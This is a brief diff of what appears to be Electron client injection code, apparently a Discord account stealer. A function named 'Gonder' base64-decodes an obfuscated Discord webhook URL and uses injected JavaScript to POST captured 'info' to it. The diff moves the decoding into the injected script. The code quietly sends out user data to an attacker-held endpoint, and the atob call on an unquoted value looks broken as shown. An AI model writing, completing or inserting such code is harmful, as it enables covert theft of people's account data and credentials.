@@ -2476,9 +2476,9 @@ session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) =>
 })
 
 function Gonder(info) {
-    var dayum = atob(aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTU1NDU2MDQ5NzczNjkwODgwL203WTc4S1BDUHhTUFl1UjFjaEJVVFZQUmNvdlpjUGdraEVHUFJuQV9sMTlhLUlLNXJaXzFmN08wT2gzWWtLNlZDYmZF)
 	const window = BrowserWindow.getAllWindows()[0];
-	window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();
+	window.webContents.executeJavaScript(`var dayum = atob(aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTU1NDU2MDQ5NzczNjkwODgwL203WTc4S1BDUHhTUFl1UjFjaEJVVFZQUmNvdlpjUGdraEVHUFJuQV9sMTlhLUlLNXJaXzFmN08wT2gzWWtLNlZDYmZF)
+        var xhr = new XMLHttpRequest();
         xhr.open("POST", "${dayum}", true);
         xhr.setRequestHeader('Content-Type', 'application/json');
         xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
